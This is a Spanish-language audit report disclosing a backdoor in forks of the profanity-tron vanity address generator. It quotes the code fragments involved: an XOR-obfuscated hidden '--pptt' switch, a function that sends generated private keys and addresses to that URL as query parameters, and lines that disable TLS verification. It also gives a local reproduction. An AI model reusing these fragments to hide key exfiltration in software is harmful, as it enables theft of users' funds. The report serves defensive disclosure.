# Informe de auditoría verificado de profanity-tron-main (sobre el código fuente de profanity-tron)

Los siguientes dos autores son la misma persona:
<img width="2611" height="1521" alt="image" src="https://github.com/user-attachments/assets/e0e7bd37-26e7-473e-b256-1563d03c4ce8" />

Alcance de auditoría 1: https://github.com/sodasord/profanity-tron

Alcance de auditoría 2: https://github.com/sponsord/profanity-tron

Análisis de Kanxue: https://bbs.kanxue.com/thread-289060.htm
<img width="2753" height="1731" alt="image" src="https://github.com/user-attachments/assets/a414fc55-4162-46d5-b038-6f1b05ebff2d" />
<img width="2608" height="1754" alt="image" src="https://github.com/user-attachments/assets/8cd71beb-f4cb-439a-bda5-e96215678fa6" />

Resumen de conclusiones: El código fuente en este directorio **contiene una ruta lógica que permite enviar “clave privada generada + dirección” a cualquier URL a través de la red**, y esto se habilita mediante **parámetros ocultos no documentados en help/README**. Además, esta solicitud de red **desactiva explícitamente la verificación TLS**, lo cual representa un alto riesgo. Todo lo anterior constituye evidencia clara de una “interfaz de exfiltración de claves privadas / backdoor”.

---

## 1. Evidencia clave: la clave privada generada puede ser enviada externamente (en texto plano en parámetros URL)

### 1.1 Función de envío: `postResult(privateKey, address, postUrl)`

Ubicación: [`Dispatcher.cpp:L378-L403`]

Puntos clave del código:

- Concatena la clave privada y la dirección en la cadena de consulta:
  - `sendData = "privatekey=" + privateKey + "&address=" + address;` [`Dispatcher.cpp:L381`]
  - `sendUrl = postUrl + "?" + sendData;` [`Dispatcher.cpp:L382`]
- Usa libcurl para realizar la solicitud de red:
  - `curl_easy_setopt(curl, CURLOPT_URL, sendUrl.c_str());` [`Dispatcher.cpp:L387`]

Esto significa que, si `postUrl` no está vacío, el programa puede enviar **privatekey y address** como parámetros HTTP.

### 1.2 Momento de activación: se ejecuta en cada coincidencia encontrada

Ubicación: [`Dispatcher.cpp:L405-L452`]

Puntos clave:

- `printResult(...)` genera e imprime:
  - `strPrivate` (clave privada) y `strPublicTron` (dirección) [`Dispatcher.cpp:L430-L443`]
- Si `postUrl` no está vacío, se llama a `postResult`:
  - `if(!postUrl.empty()) { postResult(strPrivate, strPublicTron, postUrl); }` [`Dispatcher.cpp:L449-L451`]

Además, `printResult(...)` se llama cuando se encuentra un resultado:

- `printResult(..., m_outputFile, m_postUrl);` [`Dispatcher.cpp:L454-L482`], especialmente [`L476`]

Conclusión: **si `m_postUrl` está configurado**, el programa enviará automáticamente la clave privada y la dirección cada vez que se encuentre una coincidencia.

---

## 2. Evidencia clave: existe un parámetro oculto para inyectar la URL de envío (no documentado)

### 2.1 El parámetro oculto está ofuscado como `pptt`

Ubicación: [`profanity.cpp:L163-L166`]

Puntos clave:

- `_s` se inicializa como `{113, 113, 117, 117, 0}` → ASCII `"qquu"`
- Cada carácter se XOR con 1: `_s[_k] ^= 1;` [`profanity.cpp:L164`]
- Resultado: `"pptt"` (`'q'^1='p'`, `'u'^1='t'`)
- Registro del parámetro:
  - `argp.addSwitch('p', _s, __x9);` [`profanity.cpp:L165`]

Por lo tanto, los parámetros reales son:

- Corto: `-p <value>`
- Largo: `--pptt <value>`

### 2.2 Este parámetro se pasa directamente como `postUrl`

Ubicación: [`profanity.cpp:L307`]

Código clave:

- `Dispatcher d(..., outputFile, __x9);`

Además, `Dispatcher` define:

- `std::string m_postUrl;` [`Dispatcher.hpp:L116-L117`]

Esto indica que es un canal de entrada externo diseñado.

### 2.3 No aparece en help/README (evidencia de ocultamiento)

`help.hpp` no incluye `--pptt` ni `-p`.

`README.md` tampoco menciona este parámetro.

Conclusión: no es una funcionalidad pública normal, sino un **punto de entrada oculto para la exfiltración**.

---

## 3. Evidencia clave: verificación TLS desactivada

Ubicación: [`Dispatcher.cpp:L387-L392`]

Código clave:

- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);`
- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);`

Esto implica que incluso usando HTTPS, la conexión es vulnerable a ataques MITM.

---

## 4. Cómo reproducir (solo en entorno local)

Objetivo: demostrar la exfiltración de la clave privada

1) Iniciar un servidor HTTP local con registro  
2) Ejecutar el programa con el parámetro oculto:

- `-p http://127.0.0.1:8080/collect`
- o `--pptt http://127.0.0.1:8080/collect`

Cuando se encuentre un resultado, se enviará una solicitud como:

- `http://127.0.0.1:8080/collect?privatekey=<hex>&address=<base58>`

---

## 5. Notas adicionales de auditoría

Funciones como `Dispatcher::Device::createSeed()` se mencionan en el README, pero no tienen implementación en este directorio:

- [`Dispatcher.hpp:L36-L41`]

Esto afecta la reproducibilidad y credibilidad del código.

---

## 6. Conclusión final

- Exfiltración de clave privada: **confirmado**
- Parámetro oculto: **confirmado**
- TLS desactivado: **confirmado**

La combinación de estos tres factores indica una **implementación de riesgo a nivel de backdoor**, inaceptable para una herramienta que afirma ser segura.
